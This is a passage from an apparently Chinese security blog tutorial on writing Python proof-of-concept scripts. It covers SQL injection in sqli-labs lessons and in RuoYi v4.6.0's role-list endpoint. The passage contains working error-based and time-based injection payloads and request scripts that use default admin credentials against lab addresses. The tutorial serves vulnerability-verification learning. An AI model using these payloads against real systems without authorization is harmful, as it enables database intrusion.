class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 POST 数据包，并创建 SQL 语句，查询数据库版本，验证漏洞</span></span><br><span class="line">payload = &#123;<span class="string">&quot;uname&quot;</span>: <span class="string">&quot;&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;utgs&#x27;=&#x27;utgs&quot;</span>,</span><br><span class="line">           <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 HTTP POST 请求，注入 payload 并获取页面响应，匹配相应字段判断是否存在注入</span></span><br><span class="line">res = requests.post(url, headers = headers, data = payload, timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若 res 返回的响应中存在 &quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot; 则证明存在漏洞，否则不存在</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Vulnerable to SQL injection: &#x27;</span> + url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Not Vulnerable: &#x27;</span> + url)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>当存在漏洞时，返回 <code>[+] Vulnerable to SQL injection: + url</code> 响应</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134601141.png" data-caption="image-20230522134601141"><img src="/../images/poc/image-20230522134601141.png" alt="image-20230522134601141"></a></p><p>当不存在漏洞时，返回 <code>[+] Vulnerable to SQL injection: + url</code> 响应</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134717406.png" data-caption="image-20230522134717406"><img src="/../images/poc/image-20230522134717406.png" alt="image-20230522134717406"></a></p><p><strong>3、单引号延时注入（POST）</strong>，POST 型单引号延时注入利用 Less-15 进行 Poc 代码编写学习</p><p>正常页面</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230509213505706.png" data-caption="image-20230509213505706"><img src="/../images/poc/image-20230509213505706.png" alt="image-20230509213505706"></a></p><p>通过抓包确定其存在 sql 延时注入，经过测试后确认其 payload 为</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT 2707 FROM (SELECT(SLEEP(5)))vWgP) AND &#x27;</span>xDGW<span class="string">&#x27;=&#x27;</span>xDGW</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230509213645889.png" data-caption="image-20230509213645889"><img src="/../images/poc/image-20230509213645889.png" alt="image-20230509213645889"></a></p><p><strong>Poc 简单编写</strong></p><p>本次延时注入 Poc 编写主要多了 time 库，利用 time 库获取其请求时间与结束的响应时间，通过时间的响应时长，判断是否存在延时注入</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：post_sql_injection.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入 requests 库</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置漏洞链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155/Less-12/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 headers 头，告诉服务器请求的客户端是什么类型的设备或应用程序，有些服务器可能会根据User-Agent字段来做特定的处理，例如根据设备类型返回不同的内容或应用不同的限制策略，避免被 ban</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 POST 数据包，并创建 SQL 语句，查询数据库版本，验证漏洞</span></span><br><span class="line">payload = &#123;<span class="string">&quot;uname&quot;</span>: <span class="string">&quot;&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;utgs&#x27;=&#x27;utgs&quot;</span>,</span><br><span class="line">           <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 HTTP POST 请求，注入 payload 并获取页面响应，匹配相应字段判断是否存在注入</span></span><br><span class="line">res = requests.post(url, headers = headers, data = payload, timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若 res 返回的响应中存在 &quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot; 则证明存在漏洞，否则不存在</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Vulnerable to SQL injection: &#x27;</span> + url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Not Vulnerable: &#x27;</span> + url)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>验证存在漏洞，当存在漏洞时，返回 <code>[+] Vulnerable to SQL injection </code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522135150483.png" data-caption="image-20230522135150483"><img src="/../images/poc/image-20230522135150483.png" alt="image-20230522135150483"></a></p><p>当不存在漏洞时，返回 <code>[+] Not Vulnerable to SQL injection </code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522135225310.png" data-caption="image-20230522135225310"><img src="/../images/poc/image-20230522135225310.png" alt="image-20230522135225310"></a></p><h3 id="若依-v-4-6-0-后台-SQL-注入"><a href="#若依-v-4-6-0-后台-SQL-注入" class="headerlink" title="若依 v 4.6.0 后台 SQL 注入"></a>若依 v 4.6.0 后台 SQL 注入</h3><p>通过上面的基础的学习，初步了解了 Poc 编写的简单实现，这边利用 <code>若依后台注入</code>实例继续学习 Poc 的编写，环境搭建以及相关漏洞代码分析这里不赘述，若有需求，可参考个人 blog 文章  <a href="https://funsiooo.github.io/2023/03/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AD)-%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV4-6-0/">Java代码审计(六)-若依管理系统V4.6.0</a></p><blockquote><p>影响版本：RuoYi &lt;&#x3D;4.6.1</p></blockquote><h4 id="POC-代码编写分析"><a href="#POC-代码编写分析" class="headerlink" title="POC 代码编写分析"></a>POC 代码编写分析</h4><p>在正式开始编写 Poc 时，需充分分析该漏洞的特点，以及 Poc 编写过程中需要解决的难点，一一列出来，然后逐点击破，该搜索搜索，该找资料找资料，该问人就得问人，先简单能实现漏洞验证功能后再去完善格式，美化代码。</p><p>1、漏洞位置在登录后台后，角色管理处抓包后添加 <code>params[dataScope]</code>参数，漏洞具体链接 <a href="http://192.168.148.184:8888/system/role/list">http://192.168.148.184:8888/system/role/list</a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230510203321621.png" data-caption="image-20230510203321621"><img src="/../images/poc/image-20230510203321621.png" alt="image-20230510203321621"></a></p><p>利用 Burp 抓到的原始数据包信息</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230511213027417.png" data-caption="image-20230511213027417"><img src="/../images/poc/image-20230511213027417.png" alt="image-20230511213027417"></a></p><p>添加漏洞参数 <code>params[dataScope]</code>，经测试存在漏洞，这里 Poc 编写与上面基础学习中的 POST 注入实例差异不大，主要解决的问题是解决登录问题，具体完整 POST 请求体如下</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageSize=<span class="number">10</span>&amp;pageNum=<span class="number">1</span>&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;roleName=&amp;roleKey=&amp;status=&amp;params%5BbeginTime%<span class="number">5D</span>=&amp;params%5BendTime%<span class="number">5D</span>=&amp;params[dataScope]=and+updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT+version()),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">2523</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230511213252661.png" data-caption="image-20230511213252661"><img src="/../images/poc/image-20230511213252661.png" alt="image-20230511213252661"></a></p><p>2、<strong>登录分析</strong>，登录需要检查验证码，若验证码输入错误，系统返回信息 <code>&#123;&quot;msg&quot;:&quot;验证码错误&quot;,&quot;code&quot;:500&#125;</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230511214039469.png" data-caption="image-20230511214039469"><img src="/../images/poc/image-20230511214039469.png" alt="image-20230511214039469"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230511214311347.png" data-caption="image-20230511214311347"><img src="/../images/poc/image-20230511214311347.png" alt="image-20230511214311347"></a></p><p>由上图可知，系统请求登录 post 数据包请求体为 <code>username=admin&amp;password=admin123&amp;validateCode=1&amp;rememberMe=false</code>，登录时系统还带有一个 Cookie 验证，所以 Cookie 的获取也是需要我们解决的问题。</p><h4 id="分析小结"><a href="#分析小结" class="headerlink" title="分析小结"></a>分析小结</h4><p>漏洞处于后台的 POST 请求，在编写 Poc 时需要先解决登录，后再进行 POST 数据请求验证漏洞</p><blockquote><p>1、登录需要验证码验证</p><p>2、登录请求需要携带 Cookie 值，且当用户在前台登录后退出会 Cookie 会进行更新</p></blockquote><h4 id="Poc-初步编写"><a href="#Poc-初步编写" class="headerlink" title="Poc 初步编写"></a>Poc 初步编写</h4><p>1、利用 Python 解决登录问题，这里只需使用 requests 库即可，我们先利用 Burp 抓包获取其 POST 数据格式</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513100250547.png" data-caption="image-20230513100250547"><img src="/../images/poc/image-20230513100250547.png" alt="image-20230513100250547"></a></p><p>登录成功数据包及返回包如下图，<code>username</code>、<code>pasword</code> 参数为账户密码参数，<code>validateCode</code> 参数为验证码参数，<code>remnberMe</code> 为记住密码参数</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin123&amp;validateCode=<span class="number">2</span>&amp;rememberMe=<span class="literal"><span class="keyword">false</span></span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513100446127.png" data-caption="image-20230513100446127"><img src="/../images/poc/image-20230513100446127.png" alt="image-20230513100446127"></a></p><p>2、Python 构造登录请求包</p><p>通过初步分析请求，发现无论账号密码、验证码是否正确均返回响应为 <code>&#123;&quot;msg&quot;:&quot;验证码错误&quot;,&quot;code&quot;:500&#125;</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513101559864.png" data-caption="image-20230513101559864"><img src="/../images/poc/image-20230513101559864.png" alt="image-20230513101559864"></a></p><p>初步编写的代码如下，先验证是否能正常登录</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求登录的 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.103:8888/login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Headers 可以模拟浏览器发送HTTP请求，避免被拦截</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 POST 数据包，参数与用户输入数据分别用单引号或者双引号括起来且中间使用:分隔开</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 request 请求 post 进行登陆</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回请求响应文本</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p>通过抓包分析发现，在进行 POST 请求时，登录请求需要带有 Cookie 值，用户在前台登录后退出重新请求登录后  Cookie 值后会发生变化</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513102003591.png" data-caption="image-20230513102003591"><img src="/../images/poc/image-20230513102003591.png" alt="image-20230513102003591"></a></p><p>3、解决 Cookie 值问题，这里先简单将 Cookie 值手动添加到 Python 代码中，在代码中携带 Cookie 进行登录请求</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求登录的 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.103:8888/login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Headers 可以模拟浏览器发送 HTTP 请求，避免被拦截，并携带 Cookie 值进行请求</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;JSESSIONID=8a3a309c-9bf1-4936-8c92-1fecd58ab1ed&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 POST 数据包，参数与用户输入数据分别用单引号或者双引号括起来且中间使用:分隔开</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 request 请求 post 进行登陆</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回请求响应文本</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513102452982.png" data-caption="image-20230513102452982"><img src="/../images/poc/image-20230513102452982.png" alt="image-20230513102452982"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513102657847.png" data-caption="image-20230513102657847"><img src="/../images/poc/image-20230513102657847.png" alt="image-20230513102657847"></a></p><p>4、登录后继续请求 POST 数据包进行漏洞验证，成功返回响应，脚本可用</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求登录的 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.103:8888/login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Headers 可以模拟浏览器发送 HTTP 请求，避免被拦截，并携带 Cookie 值进行请求</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;JSESSIONID=81be198a-87df-4a09-914c-19b71ef32709&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 POST 数据包，参数与用户输入数据分别用单引号或者双引号括起来且中间使用:分隔开</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 request 请求 post 进行登陆</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上一步登录的响应中若存在 &quot;操作成功&quot; 文本则进行下一步的 POST 请求</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;操作成功&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="comment"># 继上一步的登陆后，构造登陆后的数据请求 URL，下面为漏洞链接</span></span><br><span class="line">    post_url = <span class="string">&#x27;http://192.168.1.103:8888/system/role/list&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造登陆后的数据请求 POST 包，这里是漏洞链接的 POST 数据包</span></span><br><span class="line">    post_data = &#123;<span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;pageNum&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;orderByColumn&#x27;</span>: <span class="string">&#x27;roleSort&#x27;</span>, <span class="string">&#x27;isAsc&#x27;</span>: <span class="string">&#x27;asc&#x27;</span>, <span class="string">&#x27;roleName&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;roleKey&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BbeginTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BendTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;params[dataScope]&#x27;</span>: <span class="string">&#x27;and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523&#x27;</span>&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 登陆后继续保持 headers 头，这一步很重要，如果没有这一步就无法保持客户端与服务器的连接，继而无法进行后台请求</span></span><br><span class="line">    post_headers = headers</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始后台漏洞验证的 POST 请求</span></span><br><span class="line">    post_requests = requests.post(url=post_url,data=post_data,headers=post_headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若 post_requests 数据请求响应存在 &quot;java.sql.SQLException: XPATH syntax error&quot; 则证明存在漏洞，返回 &quot;[+] Vulnerable to SQL injection&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;java.sql.SQLException: XPATH syntax error:&quot;</span> <span class="keyword">in</span> post_requests.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Vulnerable to SQL injection&quot;</span>)</span><br><span class="line">    <span class="comment"># 若不存在 &quot;java.sql.SQLException: XPATH syntax error&quot; 则证明存在不漏洞，返回 &quot;[-] Not vulnerable to SQL injection &quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Not vulnerable to SQL injection &quot;</span>)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513112813776.png" data-caption="image-20230513112813776"><img src="/../images/poc/image-20230513112813776.png" alt="image-20230513112813776"></a></p><p>将漏洞参数去掉，重新再验证 Poc 是否还存在漏洞若还是返回 <code>[+] Vulnerable to SQL injection</code> 则代码存在问题，去掉漏洞参数后，响应返回 <code>[-] Not vulnerable to SQL injection</code>， Poc 正常运行</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513112611949.png" data-caption="image-20230513112611949"><img src="/../images/poc/image-20230513112611949.png" alt="image-20230513112611949"></a></p><p>到此为止，一个简易的若依后台注入 Poc 就编写完成了。</p><h4 id="完善代码"><a href="#完善代码" class="headerlink" title="完善代码"></a>完善代码</h4><p>由上面的代码可知，请求中的 <code>URL</code> 、<code>Cooike值</code>、<code>验证码</code>一旦请求发生改变均需要手动修改代码，体验不好，这边使用 <code>argparse</code> 库，直接利用命令行参数的模式输入这些值，而且代码格式相对混乱没有进行模块化处理，这边使用函数的方式，将代码模块化，提高代码阅读性</p><p>美化后的代码如下，主要修改为将初步编写的代码设置一个 <code>Poc()</code> 函数模块化代码，提高代码阅读性；添加了 <code>banner()</code> 函数用于脚本成功执行时输出 <code>banner</code>，美化脚本；使用 <code>argparse</code> 库将之前的脚本<code>需要输入的参数值</code>修改为<code>通过命令行参数传入</code>相应的值，方便脚本的运行，避免需要打开脚本手动传入参数值。</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个解析对象parser，用于装载参数的容器</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;python3 demo.py -u [login_url] -c [cookie] -v [Verification_Code] -b [Vul Links]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数的显示，require=True为当用户输入错误时，系统返回提示正确的输入方式，help为描述</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span 